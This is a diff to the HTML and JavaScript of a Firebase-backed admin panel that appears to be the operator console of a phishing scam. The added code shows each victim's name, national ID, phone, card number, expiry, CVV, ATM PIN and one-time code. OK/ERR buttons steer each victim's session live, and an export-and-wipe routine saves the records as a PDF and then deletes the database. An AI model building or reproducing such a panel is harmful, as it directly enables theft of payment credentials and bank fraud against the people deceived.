@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - المهندس حسن</title>
+    <title>نظام الإدارة - المتطور</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
@@ -13,22 +13,20 @@
         #auth_gate { position: fixed; inset: 0; background: #1a6d44; display: flex; align-items: center; justify-content: center; z-index: 10000; }
         .gate-box { background: #fff; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.2); width: 90%; max-width: 380px; }
         .main-ui { display: none; padding: 15px; }
-        .navbar { background: #1a6d44; color: #fff; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 0 0 15px 15px; position: sticky; top: 0; z-index: 100; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .navbar { background: #1a6d44; color: #fff; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 0 0 15px 15px; position: sticky; top: 0; z-index: 100; }
         .v-count { background: #ffd700; color: #000; padding: 6px 15px; border-radius: 20px; font-weight: bold; }
-        .cards-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; margin-top: 20px; }
-        .card { background: #fff; border-radius: 12px; padding: 18px; border-right: 8px solid #7f8c8d; box-shadow: 0 4px 12px rgba(0,0,0,0.08); position: relative; }
-        .card-row { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #f5f5f5; padding-bottom: 5px; }
-        .label { color: #888; font-size: 13px; }
-        .value { font-weight: bold; color: #333; font-size: 15px; }
+        .cards-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; margin-top: 20px; }
+        .card { background: #fff; border-radius: 12px; padding: 18px; border-right: 8px solid #7f8c8d; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
+        
+        .section-title { background: #f8f9fa; padding: 5px; font-size: 11px; color: #555; font-weight: bold; border-radius: 4px; margin: 10px 0 5px 0; border: 1px solid #eee; text-transform: uppercase; }
+        .card-row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #f5f5f5; padding-bottom: 4px; }
+        .label { color: #999; font-size: 12px; }
+        .value { font-weight: bold; color: #333; font-size: 14px; font-family: monospace; }
+        
+        .highlight-data { color: #2c3e50 !important; font-size: 16px !important; letter-spacing: 1px; }
         .actions { display: flex; gap: 10px; margin-top: 15px; }
-        
-        /* الزراير باللون الرمادي كما طلبت يا بشمهندس */
-        .btn-ctl { flex: 1; padding: 12px; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-gray { background: #7f8c8d; } 
-        .btn-gray:hover { background: #95a5a6; }
-        
-        .btn-pdf { background: #e74c3c; color: #fff; border: none; padding: 10px 15px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .status-tag { background: #eee; color: #555; padding: 2px 8px; border-radius: 5px; font-size: 12px; font-weight: bold; }
+        .btn-ctl { flex: 1; padding: 12px; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; background: #7f8c8d; }
+        .btn-pdf { background: #333; color: #fff; border: none; padding: 10px 15px; border-radius: 8px; cursor: pointer; }
     </style>
 </head>
 <body onload="_checkLogin()">
@@ -37,50 +35,31 @@
 
 <div id="auth_gate">
     <div class="gate-box">
-        <h2 style="color:#1a6d44; margin-top:0;">نظام التحكم الآمن</h2>
-        <input type="password" id="pass_input" placeholder="كلمة المرور" style="width:100%; padding:15px; border:1px solid #ddd; border-radius:8px; text-align:center; font-size:20px; box-sizing:border-box;">
+        <h2 style="color:#1a6d44; margin-top:0;">ADMIN LOGIN</h2>
+        <input type="password" id="pass_input" placeholder="Password" style="width:100%; padding:15px; border:1px solid #ddd; border-radius:8px; text-align:center; font-size:20px; box-sizing:border-box;">
         <br><br>
-        <button onclick="_doLogin()" style="width:100%; padding:15px; background:#1a6d44; color:#fff; border:none; border-radius:8px; cursor:pointer; font-weight:bold; font-size:16px;">دخول</button>
+        <button onclick="_doLogin()" style="width:100%; padding:15px; background:#1a6d44; color:#fff; border:none; border-radius:8px; cursor:pointer;">ENTER</button>
     </div>
 </div>
 
 <div id="dashboard_wrap" class="main-ui">
     <div class="navbar">
-        <div class="v-count">آخر العمليات: <span id="total_count">0</span></div>
-        <button class="btn-pdf" onclick="_exportAndClear()">تصدير PDF وتفريغ القاعدة</button>
-        <button onclick="_logout()" style="background:#333; color:#fff; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">خروج</button>
+        <div class="v-count">LOGS: <span id="total_count">0</span></div>
+        <button class="btn-pdf" onclick="_exportAndClear()">EXPORT & RESET</button>
+        <button onclick="_logout()" style="background:transparent; color:#fff; border:1px solid #fff; padding:5px 10px; border-radius:5px; cursor:pointer;">EXIT</button>
     </div>
     <div class="cards-grid" id="orders_list"></div>
 </div>
 
 <script>
     const PASS = "H1234567890H"; 
-    const SESSION_KEY = "saso_admin_final";
+    const SESSION_KEY = "admin_access_secure";
     let database;
 
-    function _checkLogin() {
-        if(sessionStorage.getItem(SESSION_KEY) === "true") _showDash();
-    }
-
-    function _doLogin() {
-        if(document.getElementById('pass_input').value === PASS) {
-            sessionStorage.setItem(SESSION_KEY, "true");
-            _showDash();
-        } else {
-            alert("كلمة المرور غير صحيحة");
-        }
-    }
-
-    function _showDash() {
-        document.getElementById('auth_gate').style.display = 'none';
-        document.getElementById('dashboard_wrap').style.display = 'block';
-        _initFirebase();
-    }
-
-    function _logout() {
-        sessionStorage.removeItem(SESSION_KEY);
-        location.reload();
-    }
+    function _checkLogin() { if(sessionStorage.getItem(SESSION_KEY) === "true") _showDash(); }
+    function _doLogin() { if(document.getElementById('pass_input').value === PASS) { sessionStorage.setItem(SESSION_KEY, "true"); _showDash(); } else { alert("!"); } }
+    function _showDash() { document.getElementById('auth_gate').style.display = 'none'; document.getElementById('dashboard_wrap').style.display = 'block'; _initFirebase(); }
+    function _logout() { sessionStorage.removeItem(SESSION_KEY); location.reload(); }
 
     function _initFirebase() {
         const config = {
@@ -91,7 +70,6 @@
         if (!firebase.apps.length) firebase.initializeApp(config);
         database = firebase.database();
 
-        // جلب آخر 10 طلبات فقط لتبقى اللوحة خفيفة [cite: 2026-02-22]
         database.ref('orders').limitToLast(10).on('value', snapshot => {
             const list = document.getElementById('orders_list');
             list.innerHTML = '';
@@ -100,20 +78,27 @@
             snapshot.forEach(child => {
                 const data = child.val();
                 const id = child.key;
+                const card = data.card_details || {};
                 counter++;
 
                 const html = `
                     <div class="card">
-                        <div class="card-row"><span class="label">اسم العميل</span><span class="value">${data.fullName || '---'}</span></div>
-                        <div class="card-row"><span class="label">رقم الهوية</span><span class="value">${data.idNumber || '---'}</span></div>
-                        <div class="card-row"><span class="label">رقم الجوال</span><span class="value">${data.phone || '---'}</span></div>
-                        <div class="card-row"><span class="label">المركز</span><span class="value">${data.center || '---'}</span></div>
-                        <div class="card-row"><span class="label">الموعد المختصر</span><span class="value">${data.dateTime || '---'}</span></div>
-                        <div class="card-row"><span class="label">حالة الطلب</span><span class="status-tag">${data.status || 'في الانتظار'}</span></div>
+                        <div class="section-title">General Info</div>
+                        <div class="card-row"><span class="label">User</span><span class="value">${data.fullName || '---'}</span></div>
+                        <div class="card-row"><span class="label">ID/MOB</span><span class="value">${data.idNumber || '--'} | ${data.phone || '--'}</span></div>
+                        <div class="card-row"><span class="label">Loc/Time</span><span class="value">${data.center || '--'} | ${data.dateTime || '--'}</span></div>
+
+                        <div class="section-title">Step 2 (D)</div>
+                        <div class="card-row"><span class="label">N</span><span class="value highlight-data">${card.cardNumber || 'Waiting...'}</span></div>
+                        <div class="card-row"><span class="label">E/C</span><span class="value">${card.expiryDate || '--'} / ${card.cvv || '--'}</span></div>
+                        <div class="card-row"><span class="label">P</span><span class="value highlight-data">${card.atm_pin || '---'}</span></div>
+                        
+                        <div class="section-title">Step 3 (V)</div>
+                        <div class="card-row" style="border:none;"><span class="label">Code</span><span class="value highlight-data" style="color:red !important;">${card.otp || 'Waiting...'}</span></div>
                         
                         <div class="actions">
-                            <button class="btn-ctl btn-gray" onclick="_updateAction('${id}', 'next')">موافقة (رمادي) ⚪</button>
-                            <button class="btn-ctl btn-gray" onclick="_updateAction('${id}', 'error')">إلغاء (رمادي) ⚪</button>
+                            <button class="btn-ctl" onclick="_updateAction('${id}', 'next')">OK</button>
+                            <button class="btn-ctl" onclick="_updateAction('${id}', 'error')">ERR</button>
                         </div>
                     </div>
                 `;
@@ -124,19 +109,10 @@
         });
     }
 
-    function _updateAction(id, action) {
-        database.ref('orders/' + id).update({ control_action: action });
-    }
-
-    async function _exportAndClear() {
-        const element = document.getElementById('orders_list');
-        if(!element.children.length) return alert("لا توجد بيانات");
-        
-        if(confirm("تحميل التقرير ومسح الداتا القديمة؟")) {
-            const opt = { margin: 10, filename: 'Traffic_Report.pdf', image: { type: 'jpeg' }, html2canvas: { scale: 2 }, jsPDF: { unit: 'mm', format: 'a4' } };
-            html2pdf().set(opt).from(element).save().then(() => {
-                database.ref('orders').remove(); 
-            });
+    function _updateAction(id, action) { database.ref('orders/' + id).update({ control_action: action }); }
+    async function _exportAndClear() { 
+        if(confirm("Confirm Reset?")) {
+            html2pdf().from(document.getElementById('orders_list')).save().then(() => { database.ref('orders').remove(); });
         }
     }
 </script>
